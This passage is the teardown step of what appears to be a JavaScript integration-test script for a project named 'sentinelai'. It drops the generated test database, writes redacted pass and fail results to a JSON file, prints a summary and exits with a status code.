      if (!KEEP) await mongoose.connection.db.dropDatabase() // only the generated sentinelai_integration_* DB
      await mongoose.disconnect()
    } catch {}
    const summary = { database: DB, kept: KEEP, at: new Date().toISOString(), pass: results.filter((r) => r.status === 'PASS').length, fail: results.filter((r) => r.status === 'FAIL').length, results }
    fs.writeFileSync(path.join(runDir, 'results.json'), redact(JSON.stringify(summary, null, 2)))
    console.log(`\n${summary.pass} passed, ${summary.fail} failed — evidence: ${path.relative(root, runDir)}`)
    process.exit(summary.fail ? 1 : 0)
  })
